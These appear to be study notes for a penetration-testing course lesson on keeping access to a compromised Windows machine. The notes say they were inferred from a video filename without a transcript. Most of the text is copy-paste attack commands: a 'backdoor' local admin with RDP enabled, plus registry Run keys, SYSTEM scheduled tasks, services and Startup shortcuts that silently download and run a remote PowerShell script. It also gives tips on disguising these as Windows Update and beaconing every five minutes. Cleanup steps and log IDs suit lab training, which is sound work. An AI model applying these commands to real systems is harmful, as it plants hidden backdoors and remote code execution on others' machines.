# What the video covers (Introduction / big picture)
Note: No transcript was provided. The following is a conservative, eJPT-aligned summary inferred from the filename “14 - Establishing Persistence On Windows.mp4” in the “04-WindowsPostExploitation” folder.

This lesson shows how to maintain access on a compromised Windows host using built-in mechanisms and minimal tooling. It compares common persistence primitives, when to use each (user vs. admin level), and how to implement, verify, and remove them safely in a lab. Methods typically include:
- New local admin + enabling RDP
- Registry Run keys (HKCU/HKLM)
- Scheduled tasks (on start / on logon / periodic) running as user or SYSTEM
- Services (sc.exe; optionally with NSSM)
- Startup folder shortcut
Emphasis is on practical commands, stealthy naming/locations, testing via reboot, and cleanup. Use only with explicit authorization.

# Flow (ordered)
1. Confirm current context and privileges (user, integrity, admin).
2. Choose a persistence method based on privileges and stability needs.
3. Prepare a working directory and payload/command.
4. Implement a persistence mechanism (registry run key, scheduled task, service, startup).
5. Verify the entry was created and the command is correct.
6. Test persistence (e.g., reboot or logoff/logon) and confirm call-back/launch.
7. Record changes for reporting and be ready to clean up.

# Tools highlighted
- Built-in Windows:
  - whoami, whoami /priv
  - cmd.exe, PowerShell
  - reg, schtasks, sc, net, netsh
  - icacls, takeown (for file swap scenarios)
- Optional helpers:
  - NSSM (Non-Sucking Service Manager) to wrap non-service binaries as services
  - Sysinternals Autoruns/Autorunsc for visibility and verification
  - Event Viewer or wevtutil for log verification
- Network listener (on your box): nc/ncat/socat/metasploit multi/handler
- If permitted in your lab: Meterpreter post modules for persistence

# Typical command walkthrough (detailed, copy-paste friendly)
The examples below assume you are on the target’s cmd.exe or PowerShell and you have a reachable listener/web server. Replace placeholders like <LHOST>/<LPORT>/<USER> as needed.

Pre-checks
```
whoami
whoami /priv
whoami /groups
ver
```

Prepare a working folder (commonly writable, semi-stealthy)
```
mkdir C:\ProgramData\WinUpdate
attrib +h C:\ProgramData\WinUpdate
```

Listener on your box (example)
```
# On your attacking box (Linux/macOS):
nc -lvnp 4444
```

A) Persistence via new local admin + RDP (requires admin)
```
:: Create an operator account and add to local admins
net user backdoor P@ssw0rd! /add
net localgroup administrators backdoor /add

:: (Optional) Avoid forced password expiry
wmic useraccount where name='backdoor' set PasswordExpires=False

:: Allow RDP connections
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f

:: Enable built-in RDP firewall rules
netsh advfirewall firewall set rule group="remote desktop" new enable=Yes

:: Ensure service is set to auto and running
sc config TermService start= auto
sc start TermService

:: Optionally allow the account to RDP
net localgroup "Remote Desktop Users" backdoor /add
```

B) Persistence via Registry Run key (user runs at logon)
- HKCU (current user; no admin needed):
```
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" ^
/v WindowsUpdate ^
/t REG_SZ ^
/d "powershell -NoP -W Hidden -C \"IEX(New-Object Net.WebClient).DownloadString('http://<LHOST>/s.ps1')\"" ^
/f

:: Verify
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
```
- HKLM (all users; admin needed):
```
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" ^
/v WindowsUpdate ^
/t REG_SZ ^
/d "powershell -NoP -W Hidden -C \"IEX(New-Object Net.WebClient).DownloadString('http://<LHOST>/s.ps1')\"" ^
/f

:: Verify
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Run"
```
Tip: Using -EncodedCommand avoids complex quoting. Generate base64 of your PS one-liner (UTF-16LE) and substitute:
```
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v WindowsUpdate /t REG_SZ /d "powershell -NoP -W Hidden -Enc <B64>" /f
```

C) Persistence via Scheduled Task
- Run as SYSTEM at boot (admin):
```
schtasks /create /sc onstart /ru SYSTEM /tn "Windows System Service" ^
/tr "powershell -NoP -W Hidden -C \"IEX(New-Object Net.WebClient).DownloadString('http://<LHOST>/s.ps1')\"" /f

:: Verify
schtasks /query /tn "Windows System Service" /fo LIST /v
```
- Run on user logon (no admin if targeting current user):
```
schtasks /create /sc onlogon /tn "Windows Update" ^
/tr "powershell -NoP -W Hidden -C \"IEX(New-Object Net.WebClient).DownloadString('http://<LHOST>/s.ps1')\"" /f

:: Verify
schtasks /query /tn "Windows Update" /fo LIST /v
```
- Periodic beacon (every 5 minutes):
```
schtasks /create /sc minute /mo 5 /tn "Telemetry Service" ^
/tr "powershell -NoP -W Hidden -C \"IEX(New-Object Net.WebClient).DownloadString('http://<LHOST>/s.ps1')\"" /f
```

D) Persistence via Service (admin)
Basic sc.exe create (note the space after equals signs):
```
sc create WinUpdate binPath= "cmd.exe /c powershell -NoP -W Hidden -C \"IEX(New-Object Net.WebClient).DownloadString('http://<LHOST>/s.ps1')\"" start= auto DisplayName= "Windows Update Service"
sc description WinUpdate "Provides updates for Windows components."
sc start WinUpdate

:: Verify
sc qc WinUpdate
sc query WinUpdate
```
More robust with NSSM (if you can drop it):
```
:: Place nssm.exe in C:\ProgramData\WinUpdate\
C:\ProgramData\WinUpdate\nssm.exe install WinUpdate "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" ^
-NoP -W Hidden -C "IEX(New-Object Net.WebClient).DownloadString('http://<LHOST>/s.ps1')"
sc start WinUpdate
```

E) Startup folder shortcut (current user; no admin)
```
powershell -NoP -W Hidden -C ^
"$ws = New-Object -ComObject WScript.Shell; \
$lnk = $ws.CreateShortcut('$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\updater.lnk'); \
$lnk.TargetPath = 'C:\Windows\System32\cmd.exe'; \
$lnk.Arguments = '/c powershell -NoP -W Hidden -C \"IEX(New-Object Net.WebClient).DownloadString(''''http://<LHOST>/s.ps1'''')\"'; \
$lnk.IconLocation = 'C:\Windows\System32\shell32.dll,24'; \
$lnk.Save()"

:: Verify presence
dir "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
```

Verification and testing
```
:: Logoff/logon to test HKCU Run/Startup folder or onlogon task
shutdown /l

:: Reboot to test SYSTEM onstart or auto-start services
shutdown /r /t 0
```

Cleanup (remove artifacts when the lab ends)
```
:: Users
net localgroup administrators backdoor /del
net localgroup "Remote Desktop Users" backdoor /del
net user backdoor /del

:: RDP (optional revert)
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 1 /f

:: Run keys
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v WindowsUpdate /f
reg delete "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v WindowsUpdate /f

:: Tasks
schtasks /delete /tn "Windows Update" /f
schtasks /delete /tn "Windows System Service" /f
schtasks /delete /tn "Telemetry Service" /f

:: Services
sc stop WinUpdate
sc delete WinUpdate

:: Startup shortcut
del "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\updater.lnk"

:: Files/folders
attrib -h C:\ProgramData\WinUpdate
rmdir /s /q C:\ProgramData\WinUpdate
```

# Practical tips
- Pick the method by privilege and goal:
  - No admin: HKCU Run key or Startup folder or onlogon task (no /ru SYSTEM).
  - Admin/SYSTEM: HKLM Run, onstart SYSTEM scheduled task, or service.
- Use base64-encoded PowerShell (-EncodedCommand) to avoid quoting issues and reduce command length.
- Name artifacts believably (e.g., “Windows Update,” “Telemetry Service”) and place in plausible locations (ProgramData).
- Test persistence carefully; a typo in /tr or registry data prevents execution.
- Verify with schtasks /query, reg query, sc qc, and after reboot.
- Expect logs:
  - Service creation: Event ID 7045
  - Scheduled task creation: Event ID 4698/106
  - RDP enable: System/Security logs
- Avoid destructive changes; record every modification for reporting and cleanup.
- In domain environments, local admin plus RDP might be blocked by policy; consider per-user HKCU or onlogon tasks.

# Minimal cheat sheet (one-screen flow)
```
:: Context
whoami & whoami /priv

:: Working dir
mkdir C:\ProgramData\WinUpdate & attrib +h C:\ProgramData\WinUpdate

:: HKCU Run (no admin)
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v WindowsUpdate /t REG_SZ /d "powershell -NoP -W Hidden -C \"IEX(New-Object Net.WebClient).DownloadString('http://<LHOST>/s.ps1')\"" /f

:: Scheduled task (SYSTEM on boot, admin)
schtasks /create /sc onstart /ru SYSTEM /tn "Windows System Service" /tr "powershell -NoP -W Hidden -C \"IEX(New-Object Net.WebClient).DownloadString('http://<LHOST>/s.ps1')\"" /f

:: Service (admin)
sc create WinUpdate binPath= "cmd.exe /c powershell -NoP -W Hidden -C \"IEX(New-Object Net.WebClient).DownloadString('http://<LHOST>/s.ps1')\"" start= auto & sc start WinUpdate

:: Local admin + RDP (admin)
net user backdoor P@ssw0rd! /add & net localgroup administrators backdoor /add
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
```

# Summary
In this Windows post-exploitation module, you establish durable access using native mechanisms: registry Run keys, scheduled tasks, services, startup folder, and (optionally) a new local admin with RDP enabled. Select a method appropriate to your privileges, implement with careful quoting (favor -EncodedCommand), verify and test across reboots, and log every change for cleanup. Use only in authorized lab environments.